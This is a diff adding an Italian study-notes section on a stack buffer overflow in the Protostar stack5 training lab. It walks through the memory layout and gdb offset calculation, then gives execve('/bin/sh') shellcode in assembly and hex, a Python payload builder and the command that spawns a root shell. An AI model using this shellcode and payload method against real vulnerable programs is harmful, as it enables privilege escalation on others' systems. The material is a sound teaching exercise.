@@ -201,3 +201,164 @@ Comandi utili per enumerare il DBMS:
 
 ![sql injection 1](../../images/sql_inj1.png)
 
+
+
+<br><br>
+
+## Buffer Oveflow:  
+
+Per poter capire l'attacco risulta necessario studiare il sistema, in particolare capire come è organizzato il layout di memoria di un processo e come funziona gets().  
+Si apre il manuale di gets() e si legge che tale funzione non effettua controlli di buffer overrun, quindi la funzione gets() permette input più grandi di 64 byte.  
+
+**Layout di memoria di un programma:**  
+Quando un programma viene eseguito (./file1), il sistema operativo:
+1. carica ll'eseguibile compilato in memoria per eseguirlo (istruzioni binarie del file ELF)
+2. crea un processo con uno spazio di indirizzamento _virtuale_ separato dagli altri processi
+3. All'interno di tale spazio, assegna aree (segmenti) con ruoli specifici:
+    - codice del programma 
+    - variabili statiche 
+    - heap $\rightarrow$ variabili dinamiche, usata quando programma chiede memoria a runtime
+    - stack LIFO (per le funzioni)
+    - un area riservata al Kernel  
+
+![program memory layour](../../images/memory_layout_program.png)
+
+
+La variabile `buffer[]` è piazzata sullo stack (l'allocatore di memoria GNU/Linux piazza allocazioni dinamiche piccole <128KB sul heap e piazza quella grandi >= 128KB in aree anonime mappate in memoria).  
+
+Lo stack è organizzato per record di attivazione (frame) e cresce verso gli inidrizzi bassi.  
+Gli stack frame sono **navigabili** tramite il registro `EBP` (Extended Base Pointer).  
+_Nota:_ Ogni volta che si chiama una funzione in C viene creato un record di attivazioe chiamato `stack frame`, che contiene: 
+- param b
+- param a 
+- return address 
+- old EBP
+- local variables  
+
+Il registro EBP viene usato come puntatore fisso per accedere alle variabili:
+- parametri: indirizzi positivi (EBP + offset)
+- variabili locali: indirizzi negativi (EBP - offset) 
+
+![stack of main function](../../images/memory_mainWbuffer_layout.png)  
+
+
+Il nostro `buffer[]` si trova prima del return address del main() in quanto buffer è una variabile locale alla funzione main e si trovano nello stesso frame dello stack, se lo riempiamo oltre la sua capacità i dati scendono nella memoria contigua sovrascrivendo: altre variabili locali, saved EBP e _l'indirizzo di ritorno_. 
+
+L'attacco quindi consta dei seguenti step:
+1. Eseguire il programma vulnerabile
+2. Quando viene chiesto l'input per il buffer inseriamo l'input malevolo:
+    - primo pezzo: shell code $\rightarrow$ codice macchina che apre una shell
+    - secondo pezzo: padding $\rightarrow$ byte inutili per riempire fino al punto in cui si trova il return address, la dimensione del padding è da _calcolare_!  
+3. Si esegue l'input che manda in overflow il buffer e sovrascrive le zone oltre il buffer compreso il return address che ora contiene l'indirizzo del buffer!
+4. Quando la funzione fa `ret` invece di tornare al chiamante salta all'indirizzo del buffer ed esegue lo shell code che abbiamo inserito
+5. Lo shell code apre una shell `/bin/sh` con i privilegi del file vulnerabile, se il file aveva setuid root allora si apre una shell con pieni privilegi sul sistema.  
+
+
+**Calcolo dello spazio tra buffer e return address:**  
+Nel nostro caso il il calcolo si fa tenendo conto che la cella con l'indirizzo di ritorno si trova a `EBP+4` e l'indirizzo di buffer è passato a `gets()`.  
+Si esegue il programma ./stack5 sotto debugger, si calcolano i due indirizzi richiesti e si effettua la sottrazione 
+
+$$
+\text{(EBP+4) - }\&\text{buffer}
+$$
+
+Per fare questo calcolo usiamo il debugger `gdb` e seguiamo i prossimi step:
+```bash
+gdb ./stack5
+start # creerà un breakpoint 1 temporale
+
+p $ebp+4 # per ottenere l'indirizzo di ritorno di main()
+# $1 = (void *) 0xbffffcac
+
+# disassembliamo il main per individuare la chiamata a gets()
+disassemble main 
+# ...
+# 0x080483cd <main+9>:	lea    0x10(%esp),%eax
+# 0x080483d1 <main+13>:	mov    %eax,(%esp)
+# 0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
+# ...
+
+# - notiamo che l'indirizzo di buffer viene caricato in %eax e inseriamo un breakpoint 
+# all'indirizzo in cui viene chiamata gets(), successivamente dumpiamo i registri per
+# vedere il valore di %eax che contiene l'indirizzo del buffer
+
+b * 0x80483d4
+c
+# arriviamo al breakpoint
+info registers 
+# eax            0xbffffc60	-1073742752
+# ecx            0x971dd9bb	-1759651397
+
+# prendiamo l'indirizzo di %eax e lo sottraiamo a quello di ritorno del main per ottenere 
+# il numero di byte necessari. 
+
+0xbffffcac - 0xbffffc60 = 76 
+```
+
+A questo punto dobbiamo scrivere lo shellcode, quello che vogliamo eseguire in ambiente linux è:  
+
+```bash
+execve("/bin/sh");
+exit(0);
+```
+I parametri di `execve()` sono:  
+1. `filename` $\rightarrow$ percorso del programma da eseguire (/bin/sh)
+2. `argv[]` $\rightarrow$ array di argomenti del programma (nel nostro caso NULL)
+3. `envp[]` $\rightarrow$ array delle variabili di ambiente (NULL)
+
+Nelle chiamate di sistema Linux _i parametri si passano nei registri_:
+- `eax` $\rightarrow$ numero identificativo della chiamata di sistema (execve: 11)
+- `eNx` $\rightarrow$ argomento $n$-esimo 
+
+
+
+
+```bash
+xor %eax, %eax        # azzera EAX (preparazione)
+push %eax             # push di un NULL sullo stack (terminatore stringa)
+push $0x68732f2f      # "//sh"
+push $0x6e69622f      # "/bin"
+mov %esp, %ebx        # EBX = puntatore a "/bin//sh"
+mov %eax, %ecx        # argv = NULL
+mov %eax, %edx        # envp = NULL
+mov $0xb, %al         # eax = 11 -> syscall execve
+int $0x80             # interrupt per fare la syscall
+
+xor %eax, %eax        # prepara exit(0)
+inc %eax
+int $0x80
+```
+
+Per ottenere la sequenza di byte eseguibii dobbiamo scrivere il file assembly e compilarlo senza generare l'eseguibile finale, in questo modo otteniamo gli **opcode** eseguibili.  
+Copiamo tali opcode e li inseriamo in un file python che manderà l'input malevolo.
+
+
+```python
+length = 76 #lunghezza a cui si trova il return address del main 
+
+
+# indirizzo di ritorno del buffer, è la parte che dobbiamo modificare dello script (otteniamo l'indirizzo del buffer con il debugger)
+ret = '\x00\x00\x00\x00' 
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+            "\x68\x68\x2f\x62\x69\x6e\x89" + \
+            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+            "\xcd\x80\x31\xc0\x40\xcd\x80"
+padding = 'a' * (length - len(shellcode))
+
+payload = shellcode + padding + ret
+print payload
+```
+
+A questo punto una volta calcolato l'indirizzo del buffer lo trasformiamo in little endian e lo inseriamo nello script (`ret = '\x90\xfc\xff\xbf'`).   
+
+Ora eseguiamo lo script e mettiamo l'output in `/tmp/payload`  
+A qeusto punto siamo pronti a sfruttare l'exploit, mandiamo l'input malevolo e noteremo che verrà aperta una nuova shell, facendo `id` noteremo che avremo euid=0 (root) in quanto la shell avrà ereditato i permessi del file vulenerabile.  
+
+```bash
+(cat /tmp/payload; cat) | /opt/protostar/bin/stack5
+```
+
+Risulta necessario usare due volte `cat` in quanto serve uno STDIN per la shell che creeremo (altrimenti al primo input riceverà un EOF).  
+- il primo cat inietta l'input malevolo ed attiva la shell 
+- il secondo accetta input da STDIN e lo inoltra alla shell 
+
